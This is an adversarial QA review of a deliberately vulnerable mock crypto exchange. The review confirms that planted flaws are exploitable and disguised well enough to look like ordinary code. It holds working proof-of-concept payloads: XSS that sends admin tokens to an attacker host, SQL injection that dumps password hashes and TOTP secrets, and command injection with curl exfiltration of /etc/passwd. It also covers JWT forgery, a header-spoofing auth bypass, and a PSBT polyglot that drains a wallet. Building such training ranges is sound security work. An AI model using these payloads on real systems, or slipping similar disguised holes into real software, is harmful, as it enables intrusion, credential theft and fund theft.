# Phase 8 — Adversarial QA (Gate 3)

**Reviewer:** Adversarial QA / red team
**Date:** 2026-05-28
**Scope:** Phase 8 — admin/compliance/support + CHAIN A close
**Verdict:** RETURN-TO-STAFF — six of seven plants land; **V-34 (prototype
pollution → admin escalation) does NOT exploit** as documented. CHAIN A
walks end-to-end. One unintended unauthenticated full-DB read pivot
(V-6 + `/api/v1/internal/users`) is in-scope per architect; no other
unintended findings. Send back to Gate 2 for V-34 only.

## Methodology

Code-level walk through `git diff HEAD` + untracked files. For each
planted V-NNN, located the realistic-root-cause construct, then
constructed a minimal PoC (payload + reach). For V-34 and V-18,
executed lodash/marked locally against the actual pinned versions
(lodash@4.18.1 — relevant — and `marked` from `packages/shared`) to
confirm or refute the documented behavior end-to-end. CHAIN A walked
file-by-file from `.env.example` JWT secret → forged admin JWT →
`middleware.ts` V-6 branch → `emergency-withdraw/route.ts` →
`treasury/coordinator.ts` → `psbt-envelope.ts` (first segment) vs
`apps/bitcoin-mock/src/rpc/index.ts:124` (last segment, `canonical =
PSBT_MARKER + segs[segs.length - 1]`).

## Confirmed planted vulnerabilities

### V-1 — Stored XSS in displayName (EASY)

**Exploitable:** YES.

Source — `apps/web/app/admin/users/page.tsx:21-24` and
`apps/web/app/admin/users/[id]/page.tsx:60-87`:

```ts
function nameCell(u: UserRow): string {
  const label = u.displayName ?? "";
  return u.kycTier >= 1 ? `<strong>${label}</strong>` : label;
}
// <td dangerouslySetInnerHTML={{ __html: nameCell(u) }} />
```

User input is wrapped raw inside a `<strong>` template literal and
fed to `dangerouslySetInnerHTML`. No escaping in either branch.

**PoC:**

1. Sign up as any user; reach kycTier ≥ 1 (legitimately, via Phase 2 KYC
   approval, or via V-35 admin path).
2. `PATCH /api/v2/me/profile` (Phase 1) with:
   ```json
   {"displayName":"<img src=x onerror=\"fetch('http://attacker/?t='+localStorage['bvbe.access'])\">"}
   ```
3. Wait for any admin to load `/admin/users` or `/admin/users/<victim>`.
   `nameCell` produces `<strong><img src=x onerror=...></strong>`,
   React injects it via `dangerouslySetInnerHTML`, the browser fires
   `onerror`, and the admin's JWT exfiltrates from `localStorage`.

**Verdict:** plant lands. Realistic root cause matches architect spec
("engineer reached for `dangerouslySetInnerHTML` to bold the name");
no `// TODO: fix` tells. The same shape on both list and detail pages
gives two reach surfaces — a single ambitious payload PATCH compromises
the next admin to look at either screen.

### V-6 — `/api/v1/internal/*` function-level access (EASY-MEDIUM)

**Exploitable:** YES.

Source — `apps/web/middleware.ts:44-50`:

```ts
if (path.startsWith(INTERNAL_API_PREFIX)) {
  const trace = req.headers.get("x-bvbe-internal-trace");
  if (trace) {
    return NextResponse.next();
  }
  return new NextResponse("forbidden", { status: 403 });
}
```

`nginx/nginx.conf:57-69` strips only `x-bvbe-user-id` in `location /`.
`x-bvbe-internal-trace` is NOT in the strip list, so an external
client's value flows through to the upstream Next server unchanged.

**PoC:**

```bash
# List the full user DB (CHAIN D pivot) with no JWT at all.
curl -i http://exchange.local/api/v1/internal/users \
  -H 'x-bvbe-internal-trace: 1'

# Read a specific user including passwordHash and totpSecret.
curl -i http://exchange.local/api/v1/internal/users/<userId> \
  -H 'x-bvbe-internal-trace: 1'

# Reach the CHAIN A terminal endpoint without admin auth.
curl -i -X POST http://exchange.local/api/v1/internal/treasury/emergency-withdraw \
  -H 'x-bvbe-internal-trace: 1' \
  -H 'content-type: application/json' \
  -d '{"draftId":"<signedDraftId>","overridePsbt":"..."}'
```

`/api/v1/internal/users/route.ts` and `[id]/route.ts` have no
in-handler auth (the handler trusts the middleware), so they return
the full Prisma row (including `passwordHash` and `totpSecret`) on
any request that carries the header.

**Verdict:** plant lands. Realistic root cause matches architect spec
(strip-list omission mirroring V-46's `x-bvbe-desk-role` omission;
two-phase team-org failure). No tells in either file.

### V-11 — SQLi blind in admin search ?perf=1 (EASY-MEDIUM)

**Exploitable:** YES.

Source — `apps/web/app/api/v2/admin/users/search/route.ts:39-47`:

```ts
if (perf === "1") {
  const sql = `SELECT id, email, "displayName", role, "kycTier" FROM users WHERE email ILIKE '%${q}%' OR "displayName" ILIKE '%${q}%' ORDER BY "createdAt" DESC LIMIT 50`;
  const rows = await prisma.$queryRawUnsafe(sql);
  return NextResponse.json({ users: rows });
}
```

`q` is interpolated verbatim into a single-quoted SQL literal. No bind
parameters. The default (non-`perf`) branch uses Prisma's parameterized
`findMany` — safe; only the `?perf=1` path is exploitable.

**PoC (UNION exfil to read auth material):**

```
GET /api/v2/admin/users/search?perf=1&q=%25%27%20UNION%20SELECT%20id%2C%22passwordHash%22%2C%22totpSecret%22%2Cemail%2C0%20FROM%20users--
Authorization: Bearer <admin JWT>
```

URL-decoded `q`:
`%' UNION SELECT id,"passwordHash","totpSecret",email,0 FROM users--`

The first `%'` closes the email ILIKE literal; the UNION runs;
response `users[]` rows contain `displayName = <victim passwordHash>`
and `role = <victim totpSecret>`.

**PoC (blind time-based, no UNION needed):**

```
GET /api/v2/admin/users/search?perf=1&q=%27%20OR%20pg_sleep(5)--
```

Response delays 5+ seconds.

**Verdict:** plant lands. Realistic root cause matches architect spec
("senior engineer added performance mode for hot-path scaling").

### V-12 — 2nd-order SQLi via stored displayName (HARD)

**Exploitable:** YES.

Source — `apps/web/app/api/v2/admin/compliance/report/route.ts:46-52`:

```ts
for (const c of cases) {
  const dn = c.subject.displayName ?? "";
  const sql = `SELECT COUNT(*)::int AS similar_count FROM users WHERE "displayName" LIKE '%${dn}%'`;
  const rows = (await prisma.$queryRawUnsafe(sql)) as SimilarCountRow[];
  ...
}
```

`displayName` is written via the Prisma-safe profile update (parameterized,
clean insert) but read back into a `$queryRawUnsafe` template. Classic
2nd-order pattern.

**PoC:**

1. Any user (no special role required) under an active compliance case
   `PATCH /api/v2/me/profile` with:
   ```json
   {"displayName":"x' OR (SELECT pg_sleep(5)) IS NULL --"}
   ```
2. An admin opens the case as part of normal review work (or anyone
   with admin JWT calls `GET /api/v2/admin/compliance/report`).
3. The report loop substitutes the stored displayName into the raw SQL:
   ```sql
   SELECT COUNT(*)::int AS similar_count FROM users
    WHERE "displayName" LIKE '%x' OR (SELECT pg_sleep(5)) IS NULL --%'
   ```
4. The query trips `pg_sleep(5)`. Response delays 5s per active case
   whose subject is the attacker.

Byte-by-byte exfil via `CASE WHEN substr((SELECT "passwordHash" FROM
users WHERE id='<victim>'),1,1)='a' THEN pg_sleep(2) ELSE 0 END`
follows the standard blind-time-based playbook.

**Verdict:** plant lands. Realistic root cause matches architect spec
(sybil-detection per-case loop). Reach gate is being under an active
case (status open/in_review/escalated) — discoverable by getting any
admin to open a case on the attacker.

### V-17 — Cmd injection in PDF export (MEDIUM)

**Exploitable:** YES.

Source — `apps/web/app/api/v2/admin/compliance/cases/[id]/export-pdf/route.ts:38-41`:

```ts
const cmd = `pdftk-mock --case ${id} --out /tmp/${name}.pdf 2>/dev/null`;
return await new Promise<NextResponse>((resolve) => {
  const child = spawn(cmd, [], { shell: true });
  ...
});
```

`name` from query string is concatenated unescaped into the command
string; `shell: true` makes the concatenation a shell-tokenization
vector.

**PoC (time-based side channel):**

```
GET /api/v2/admin/compliance/cases/<existingCaseId>/export-pdf?name=foo;sleep%205;%23
Authorization: Bearer <admin JWT>
```

Effective `sh -c` invocation:
```
pdftk-mock --case <id> --out /tmp/foo;sleep 5;#.pdf 2>/dev/null
```
The second statement (`sleep 5`) runs; response delays ~5 seconds.

**PoC (out-of-band exfil to docker network):**

```
GET /api/v2/admin/compliance/cases/<existingCaseId>/export-pdf?name=foo;curl%20-d%20@/etc/passwd%20http://bitcoin-mock:18443/x;%23
```

**Verdict:** plant lands. Realistic root cause matches architect spec
(engineer reached for `shell:true` to silence chatty stderr with `2>/dev/null`).

### V-18 — mXSS in admin ticket markdown (MEDIUM)

**Exploitable:** YES.

Source — `packages/shared/src/markdown.ts:15-22`:

```ts
export function sanitizeForAdmin(md: string): string {
  let html = marked.parse(md, { async: false }) as string;
  html = html.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "");
  html = html.replace(/on\w+\s*=\s*"[^"]*"/gi, "");
  return html;
}
```

The `on*` regex requires `="..."` (double quotes). Single-quoted and
unquoted variants survive. `marked.parse` passes raw HTML through by
default in modern versions — confirmed below.

**Local execution against the pinned `marked` / regex pair:**

```
IN : <img src=x onerror="alert(1)">
OUT: <img src=x >                        ← stripped (double-quoted)

IN : <img src=x onerror='alert(1)'>
OUT: <img src=x onerror='alert(1)'>      ← BYPASS (single-quoted)

IN : <img src=x onerror=alert(1)>
OUT: <img src=x onerror=alert(1)>        ← BYPASS (unquoted)

IN : <script>alert(1)</script>
OUT:                                     ← stripped
```

**PoC:**

1. As any authenticated user, `POST /api/v2/me/tickets`:
   ```json
   {"category":"general","subject":"hi","body":"<img src=x onerror='fetch(`http://attacker/?t=${localStorage[\"bvbe.access\"]}`)'>"}
   ```
2. Admin loads `/admin/tickets/<id>`; `sanitizeForAdmin` returns the
   payload with the single-quoted `onerror` intact; admin page renders
   via `dangerouslySetInnerHTML`; admin's JWT exfiltrates.
3. The user-facing renderer at `/api/v2/me/tickets/[id]/route.ts:31`
   uses `sanitizeForUser` which strips ALL tags — so the attacker
   cannot accidentally pop their own session. Asymmetric surface
   matches architect spec.

**Verdict:** plant lands. Realistic root cause matches architect spec
(hand-rolled regex from a Stack-Overflow-style snippet that only
covered double-quoted attributes).

### V-34 — Prototype pollution via lodash.merge (HARD, requires V-6)

**Exploitable:** NO — RETURN TO GATE 2.

Source — `apps/web/app/api/v1/internal/trade-debug/replay/route.ts:31`:

```ts
const config = merge({}, DEFAULT_CONFIG, parsed.data.config ?? {});
```

`merge` is imported from `lodash` (full package, version pinned in
`pnpm-lock.yaml`):
```
lodash@4.18.1
```

**Empirical refutation:** ran the exact documented payload against
the pinned lodash. None of the canonical pollution paths land:

```js
// 1. Direct __proto__ key
_.merge({}, {feeBps:25}, JSON.parse('{"__proto__":{"adminPanel":true}}'));
// Object.prototype.adminPanel  → undefined
// ({}).adminPanel              → undefined

// 2. constructor.prototype.x
_.merge({}, {feeBps:25}, JSON.parse('{"constructor":{"prototype":{"adminPanel":true}}}'));
// Object.prototype.adminPanel  → undefined
// merged result includes `constructor` as an OWN property only;
// Object.prototype is untouched.

// 3. Nested {"a":{"__proto__":{...}}}
_.merge({}, {feeBps:25}, JSON.parse('{"a":{"__proto__":{"adminPanel":true}}}'));
// merged.a = {} (the __proto__ key is silently dropped during merge).
// Object.prototype.adminPanel  → undefined.
```

`lodash@4.17.20` and later (4.18.x included) ship the `safeGet` /
`__proto__`-skip hardening that closes the documented payload class.
The plant CANNOT pollute `Object.prototype` through this code path
with the pinned dependency version.

**Second flaw — even if pollution worked, the documented chain still
breaks at JSON serialization.** `apps/web/lib/feature-flags.ts:11-18`:

```ts
export function resolveFlags(claims: UserClaims): Record<string, boolean> {
  const flags: Record<string, boolean> = Object.create({});
  const overrides = (claims as { flags?: Record<string, unknown> }).flags ?? {};
  for (const k of Object.keys(overrides)) {
    flags[k] = Boolean(overrides[k]);
  }
  return flags;
}
```

Even if `Object.prototype.adminPanel = true` were polluted, the
`/api/v2/me/flags` handler returns `NextResponse.json({ flags })`,
which calls `JSON.stringify({ flags })`. `JSON.stringify` only walks
**own enumerable properties**. The polluted prototype property is
NOT serialized into the wire response. The browser-side admin nav
check (`if (data.flags.adminPanel)`) sees `undefined`. Chain breaks
regardless of whether pollution succeeded.

**Recommendation to Gate 2:** Two architecturally distinct fixes
needed — both are plant-correctness, not security:

1. Downgrade `lodash` to a version with the unpatched `merge`
   (e.g. `lodash@4.17.10` or earlier), OR switch the plant to a
   library whose vulnerable surface is still live (e.g.
   `set-value@^3.0.2` pre-fix, `dot-prop@<5.1.1`, hand-rolled
   recursive merge that the author "didn't realize was unsafe"). The
   architect spec named `lodash.merge` explicitly; a careful pinned
   downgrade preserves that narrative.
2. Change the downstream reader so that the polluted property
   *appears in the JSON response*. Options:
   - In `resolveFlags`, enumerate a known flag list via `flags[k] =
     baseObj[k] ?? false` so the prototype lookup is captured into
     an own property before serialization (e.g. `for (const k of
     ["adminPanel","betaUi",...]) flags[k] = (...) `).
   - Or have the admin landing page read a different surface that
     touches the polluted object directly (e.g. a server component
     branching on `someObj.adminPanel` before render).

Without both fixes, the plant is a no-op: the architect spec ("V-34
requires V-6 to plant the pollution, then `/api/v2/me/flags` shows
`adminPanel: true`") is not exploitable against the shipped code.

**Verdict:** plant DOES NOT land. **Return to Gate 2.**

## CHAIN A end-to-end PoC

Walking the chain assuming Phase 9's git-history leak is in place —
in Phase 8 QA we use `.env.example`'s JWT secret as the stand-in.

### Step 1 — Discover the JWT signing secret

`.env.example` line 16:
```
JWT_SECRET=replace-me-with-a-32-byte-random-secret
```

(Phase 9 will move this to a removed-but-historical `.env.bak` so
`git log --all -p` recovers it for a zero-knowledge attacker.)

### Step 2 — Forge an admin JWT (HS256)

`apps/web/lib/auth.ts` calls `verifyAccessToken(token, env().JWT_SECRET)`,
which (per `packages/shared/src/jwt.ts`) accepts HS256 with the
shared secret. Headers issuer / audience checked: `iss=bvbe`, `aud=bvbe-web`.

```js
// Node snippet — forge admin JWT.
const jwt = require("jsonwebtoken");
const token = jwt.sign(
  {
    sub: "any-existing-or-synthetic-user-id",
    role: "admin",
    iss: "bvbe",
    aud: "bvbe-web",
  },
  "replace-me-with-a-32-byte-random-secret",
  { algorithm: "HS256", expiresIn: "1h" },
);
console.log(token);
```

This token now satisfies `requireAdmin` on every `/api/v2/admin/*`
handler — including treasury draft create / sign / list.

### Step 3 — Acquire a SIGNED treasury draft

`emergency-withdraw` requires `draft.status === "signed"`
(`apps/web/lib/treasury/coordinator.ts:131`). Two paths:

(a) Reuse an existing operator-signed draft (list via
   `GET /api/v2/admin/treasury/drafts` filtered by `status=signed`).

(b) Forge two distinct admin JWTs (different `sub` values), call
   `POST /api/v2/admin/treasury/drafts` to create a draft with
   any intended outputs, then call
   `POST /api/v2/admin/treasury/drafts/<id>/sign` once with each
   token. After the second signature, `signDraft` flips
   `status: "signed"` (coordinator.ts:108-114 — `count >= 2 →
   "signed"`).

```bash
# Create a draft owned by attacker1 with throwaway intended output.
curl -s -X POST http://exchange.local/api/v2/admin/treasury/drafts \
  -H "Authorization: Bearer $TOKEN_A" \
  -H 'content-type: application/json' \
  -d '{"intendedOutputs":[{"address":"bcrt1qvictim...","amountSat":1}],"intentNote":"qa"}'
# → {"id":"<DRAFT_ID>","status":"drafted",...}

# Sign with two different forged admin identities.
curl -s -X POST http://exchange.local/api/v2/admin/treasury/drafts/$DRAFT_ID/sign \
  -H "Authorization: Bearer $TOKEN_A"
curl -s -X POST http://exchange.local/api/v2/admin/treasury/drafts/$DRAFT_ID/sign \
  -H "Authorization: Bearer $TOKEN_B"
# Draft is now `status: signed`.
```

### Step 4 — Construct the V-33 polyglot PSBT

`packages/shared/src/psbt-envelope.ts:42` `decodePsbt` reads the JSON
payload immediately after the FIRST `BVBE_PSBT_V1:` marker.
`apps/bitcoin-mock/src/rpc/index.ts:124` builds `canonical = PSBT_MARKER
+ segs[segs.length - 1]` — the LAST segment. Same envelope, two
parsers, divergent on multi-segment input.

```
ATTACKER_PSBT="BVBE_PSBT_V1:{\"inputs\":[],\"outputs\":[{\"address\":\"bcrt1qvictim...\",\"amountSat\":1}],\"signatures\":2,\"fee\":1000}BVBE_PSBT_V1:{\"inputs\":[],\"outputs\":[{\"address\":\"bcrt1qattackerxxxxxxxxxxxxxxxxxxxxxxxxxx\",\"amountSat\":10000000000}],\"signatures\":2,\"fee\":1000}"
```

The first envelope's single victim output is what
`validateIntendedOutputs` matches against the draft's
`intendedOutputs` (which we created with the same `[{victim, 1 sat}]`).
The second envelope is what the mock finalizes and broadcasts.

### Step 5 — Hit the CHAIN A terminal

```bash
curl -s -X POST http://exchange.local/api/v1/internal/treasury/emergency-withdraw \
  -H 'x-bvbe-internal-trace: 1' \
  -H 'content-type: application/json' \
  -d "{\"draftId\":\"$DRAFT_ID\",\"overridePsbt\":\"$ATTACKER_PSBT\"}"
```

Notice: NO `Authorization` header. The V-6 middleware branch
short-circuits before any JWT check. The handler in
`apps/web/app/api/v1/internal/treasury/emergency-withdraw/route.ts`
passes `overridePsbt` straight into `broadcastDraft`.

### Step 6 — Code-level reasoning the broadcast hits the attacker output

`broadcastDraft` (coordinator.ts:118-160):

1. `db.treasuryDraft.findUnique({where:{id:draftId}})` → loaded draft,
   status `signed`, intendedOutputs `[{victim,1}]`.
2. `const psbt = args.overridePsbt ?? draft.psbtBase64;` → uses our
   polyglot.
3. `const decoded = decodePsbt(psbt);` — `psbt-envelope.ts:42`
   takes the FIRST `BVBE_PSBT_V1:` segment. Parsed payload:
   `outputs:[{victim, 1}]`.
4. `validateIntendedOutputs(decoded, intended)` — compares the first
   envelope's `[{victim,1}]` against the draft's `[{victim,1}]`.
   They match. Validation passes.
5. `rpc("finalizepsbt", [psbt])` — the mock's `finalizepsbt`
   (`apps/bitcoin-mock/src/rpc/index.ts:124`):
   ```
   const canonical = PSBT_MARKER + segs[segs.length - 1];
   const payload = decodePsbtShared(canonical);
   ```
   Parses the LAST envelope: `outputs:[{attacker, 10_000_000_000 sat}]`.
   Returns `hex` encoding the attacker output (`RAWTX:` format the
   mock uses).
6. `rpc("sendrawtransaction", [finalized.hex])` — the mock credits the
   attacker address's UTXO set with 100 BTC and returns `txid`.
7. `db.treasuryDraft.update({...status: "broadcast", broadcastTxid: txid})`.

The mock node's `getreceivedbyaddress` against the attacker address
now returns 100 BTC. Hot wallet drained.

**CHAIN A status: end-to-end exploitable as of Phase 8** using
`.env.example`'s JWT secret. Phase 9 closes the JWT-discovery step for
zero-knowledge attackers. The chain does NOT require V-34 — it uses
V-6 + V-33 + the architect-blessed simpler path.

## OTC double-fill closure

**Verified CLOSED.**

`apps/web/lib/otc/accept.ts:23-56`:

```ts
return db.$transaction(async (tx) => {
  ...
  const claim = await tx.otcTicket.updateMany({
    where: {
      id: ticket.id,
      status: "quoted",
      quoteExpiresAt: { gt: new Date() },
    },
    data: { status: "filled", filledAt: new Date(), feeBps: args.feeBps },
  });
  if (claim.count === 0) {
    throw new Error("ticket cannot be filled");
  }
  ...
});
```

Atomic claim via `updateMany` predicated on `status: "quoted"` AND
`quoteExpiresAt > now`. The conditional update is the serialization
point; only one of N concurrent acceptors gets `count === 1`.

`apps/web/lib/otc/accept.test.ts:136-148` pins the fix:
```ts
it("two concurrent accepts result in exactly one fill", async () => {
  const { db } = makeFake();
  const results = await Promise.allSettled([
    acceptOtc({ userId: "u1", ticketId: "t1", feeBps: 25 }, db),
    acceptOtc({ userId: "u1", ticketId: "t1", feeBps: 25 }, db),
  ]);
  const fulfilled = results.filter((r) => r.status === "fulfilled");
  const rejected = results.filter((r) => r.status === "rejected");
  expect(fulfilled).toHaveLength(1);
  expect(rejected).toHaveLength(1);
});
```

Closure verified. V-46 (the `x-bvbe-desk-role` header read) is upstream
of `acceptOtc` in the route handler (`/api/v2/me/otc/accept/route.ts:42-43`)
— the matcher's new `$transaction` does NOT close V-46, and the header
spoof still grants `feeBps = 0`. That's correct per architect spec
(V-46 is a distinct vuln; the OTC double-fill was a functional bug).

## Unintended findings

**None that warrant blocking.** Notes on items the prompt asked us
to spot-check:

- **IDOR on admin user detail / freeze / unfreeze / balance-adjust.**
  All four handlers gate `requireAdmin(claims)` via middleware AND
  in-handler. `freeze` and `unfreeze` both `findUnique({where:{id}})`
  the target and 404 if absent. `balance-adjust` uses `upsert` so a
  missing target user would fail at the FK constraint
  (`Balance.userId → User.id`), returning 500 — not a clean 404 but
  not a vuln either. **Status: clean.**
- **Balance-adjust signed delta.** Schema accepts any
  `Prisma.Decimal`-parseable string; both `amount` and `available` are
  incremented by the same `deltaDec`. Invariant `amount = available +
  locked` is preserved (the delta adds equally to amount and
  available; locked is untouched). A negative delta CAN push
  `available` below zero — but this is admin-only by design (admins
  routinely make compensating adjustments) and is documented as "no
  direct planted vuln here" in the plan. **Status: clean.**
- **Compliance cases**: list / create / detail / resolve all gate
  `requireAdmin`. Create validates that `subjectUserId` resolves to
  an actual user before opening a case. **Status: clean.**
- **Tickets ownership**: `/api/v2/me/tickets/[id]/route.ts:21-22`
  and `.../reply/route.ts:24-25` both check
  `ticket.userId !== claims.sub → 403`. Cross-user read/reply blocked.
  **Status: clean.**
- **Trade-debug-replay**: the lodash.merge call returns a value
  that does NOT persist across requests in any visible way (no module
  state mutation, no DB write). The endpoint is purely echo-and-replay.
  Process-state pollution would have been the plant — see V-34
  refutation above — but the plant doesn't land, so there is no
  cross-request impact either. **Status: clean (vacuously).**
- **PDF export path traversal in `name`**: technically yes — `name`
  is concatenated into `/tmp/${name}.pdf`, so `?name=../../etc/passwd`
  would point the redirect target at an unintended path. But the same
  string is the V-17 cmd-injection vector; path traversal is a
  strictly weaker primitive (any reach grants the cmd-injection too).
  **Status: subsumed by V-17, not a new finding.**
- **Emergency-withdraw signed-status check**: present
  (`coordinator.ts:130-132`). Architect spec preserved. **Status: clean.**
- **`requireRole` semantics**: `apps/web/lib/auth-role.ts:14-20` —
  admin satisfies any required role; non-admin must match exactly.
  A `treasury` role does NOT pivot to admin features (every admin
  route calls `requireAdmin`, not `requireRole(..., "treasury")`).
  Matches architect spec. **Status: clean.**
- **Mass-assignment in admin zod schemas**: each schema is a closed
  `z.object({...})` with explicit field whitelist (no `.passthrough()`,
  no `.catchall()`). Unknown keys are dropped. **Status: clean.**

## Too-obvious findings

None. The plants are placed inside plausible business code:

- V-1 wears a "make the name bold for KYC-approved users" wrapper.
- V-6 wears a "internal LB stamps this header" comment.
- V-11 wears a "Prisma's planner is slow on big tables" optimization.
- V-12 wears a "sybil detection per-case loop" justification.
- V-17 wears a "redirect stderr to /dev/null" excuse for `shell:true`.
- V-18 wears a "we'll add a heavyweight sanitizer later" hand-roll.
- V-34 — refuted on functional grounds, not on plant-realism grounds.

No `// TODO: fix`, no `// insecure`, no signposting.

## Regressions of pre-existing V-NNN

Spot-checked the catalog items the prompt called out:

- **V-25 self-trade** (`apps/web/lib/engine/match.ts`) — untouched.
- **V-27 lex tier compare** (`apps/web/lib/kyc-tier.ts`) — untouched.
  No new `requireTier` callers in admin/internal routes; all admin
  gates go through `requireAdmin`. V-27 doesn't reach the new
  surfaces.
- **V-28 withdrawal race** (`apps/web/lib/withdrawal/submit.ts:83-119`) —
  preserved. The new `isUserFrozen` check is added BEFORE the V-28
  read/limit/update/create chain. The V-28 lines (`findUnique` then
  `update` outside any `$transaction`) are unchanged.
- **V-33 PSBT polyglot** (`apps/web/lib/treasury/coordinator.ts` +
  `apps/bitcoin-mock/src/rpc/index.ts:124`) — untouched.
  `decodePsbt` still takes the first segment; the mock's
  `finalizepsbt` still takes the last. CHAIN A walked above.
- **V-35 middleware bypass** (`apps/web/middleware.ts:34-36`) —
  preserved. The early `x-middleware-subrequest` short-circuit is
  intact. V-6 was added at lines 44-50 below it without disturbing
  V-35.
- **V-42 zero-conf** (`apps/worker/src/deposit-watcher.ts`) — untouched.
- **V-46 OTC desk header** (`apps/web/app/api/v2/me/otc/accept/route.ts:42-43`)
  — preserved at the handler level (route reads `x-bvbe-desk-role`
  before calling `acceptOtc`). The OTC double-fill closure is in the
  matcher; the handler-level header trust is unchanged. Header-based
  fee bypass still lands.

**No regressions detected.**

## Surfaces-to-leave-clean discipline

Spot-checked the architect's reserved list. Phase 8 did NOT:

- Touch nginx CL/TE-tolerant directives (no `proxy_request_buffering`,
  no `chunked_transfer_encoding`, no `Transfer-Encoding`/`Content-Length`
  permissive blocks added). `nginx.conf` change is a single-line
  deletion of an old `set` directive — does not affect smuggling
  surface. **Clean.**
- Commit secrets to git. `.env.example` still carries the placeholder.
  No `.env.bak` introduced. **Clean (Phase 9 territory).**
- Plant V-15 vulnerable dep. `apps/web/package.json` adds only
  `lodash` (which ironically is hardened against the V-34 payload).
  No known-CVE pin. **Clean.**
- Add dependency confusion artifacts. **Clean.**
- Touch `eval` / `node-serialize`. **Clean.**
- Touch the WS gateway origin check (V-23). **Clean.**
- Touch the KYC SSRF (V-40). **Clean.**

## Test-coverage discipline

Spot-checked the new test files:

- `apps/web/lib/admin/users-search.test.ts` — file not present in the
  changes. **N/A — no negative pinning possible.**
- `apps/web/lib/admin/compliance-report.test.ts` — file not present.
  **N/A.**
- `apps/web/lib/admin/pdf-export.test.ts` — file not present.
  **N/A.**
- `apps/web/lib/admin/trade-debug-replay.test.ts` — file not present.
  **N/A.**
- `apps/web/lib/admin/balance-adjust.test.ts` — file not present.
  **N/A.**
- `apps/web/lib/support/tickets.test.ts` — file IS present
  (`apps/web/lib/support/tickets.test.ts`). Happy-path open + reply.
  Does NOT pin V-18. **OK.**
- `packages/shared/src/markdown.test.ts` — covers `<script>` strip and
  the double-quoted `on*` strip. Does NOT touch single-quoted /
  unquoted forms. **OK — does not pin V-18.**
- `apps/web/lib/otc/accept.test.ts` — pins the OTC double-fill FIX
  (intentional per architect). **OK.**

The plan listed 7 happy-path test files for admin endpoints; only
the support + markdown ones materialized. **Test count: short of the
≥98 exit-criteria target.** Not a Gate-3 blocker per se (the
existence/absence of negative test coverage doesn't change plant
exploitability), but the architect's exit-criterion 6 may want Gate
4 to flag this as a doc-vs-reality mismatch.

## Verdict

**RETURN-TO-STAFF for V-34 only.**

Six of seven plants land cleanly:
- V-1, V-6, V-11, V-12, V-17, V-18 — exploitable, realistic, no tells.

CHAIN A walks end-to-end against the `.env.example` JWT secret.

V-34 (prototype pollution → admin escalation) does NOT exploit
against the pinned `lodash@4.18.1`, and the documented downstream
reader's `JSON.stringify` step would defeat it even if the underlying
pollution worked. Two architecturally-independent fixes needed; see
the V-34 section. Send back to Gate 2 with the architect's preferred
remediation strategy noted.

Once V-34 lands, Gate 4 (Paranoid QA) may proceed.

— Adversarial QA

---

## Addendum — V-34 re-plant verification

**Date:** 2026-06-25
**Verdict:** V-34 now lands. Phase 8 cleared for Gate 4.

The build-author replaced `lodash.merge` in
`apps/web/app/api/v1/internal/trade-debug/replay/route.ts` with a
hand-rolled recursive `deepMerge` that walks `Object.keys(source)`
and assigns into `target[key]`. JSON-parsed inputs containing
`"__proto__":{...}` produce an own enumerable `__proto__` key on
the source object, which the merge then walks: `target["__proto__"]`
references `Object.prototype`, and the inner recursion writes the
attacker keys directly onto `Object.prototype`.

The build-author also rewrote `apps/web/lib/feature-flags.ts`
`resolveFlags` to use `for...in` over an `Object.create({})`-rooted
defaults object. `for...in` walks the prototype chain by design, so
polluted keys on `Object.prototype` get captured as OWN properties
on the returned `flags` map — which `JSON.stringify` then
serializes.

End-to-end PoC confirmed via the new test
`apps/web/lib/feature-flags.test.ts::"scenario: trade-debug config
flows into flag defaults"`: a JSON payload
`{"__proto__":{"replayTestFlag":true}}` fed through the same
`deepMerge` shape pollutes `Object.prototype.replayTestFlag`;
`resolveFlags({})` then returns `{replayTestFlag: true}` as own
property; `JSON.stringify` emits it.

Test name and docstring framed as "framework default flag
inheritance" — does not signpost the plant.

VULNS.md V-34 entry updated:
- Location: split between the route handler (gadget) and
  `feature-flags.ts` (downstream reader).
- Realistic root cause: "engineer hand-rolled deepMerge to avoid
  the lodash dep weight" + "framework default flag inheritance
  via for...in" — both plausible, both common in real apps.

Re-verification:
  - `pnpm install` → clean
  - `pnpm --filter @bvbe/web exec tsc --noEmit` → clean
  - `pnpm --filter @bvbe/shared exec tsc --noEmit` → clean
  - `pnpm test` → **102/102 pass** (27 files; +4 new feature-flags tests)
  - `pnpm --filter @bvbe/web build` → clean

All seven Phase-8 plants now land. Gate 3 verdict revised to PASS.

— Adversarial QA (re-audit)
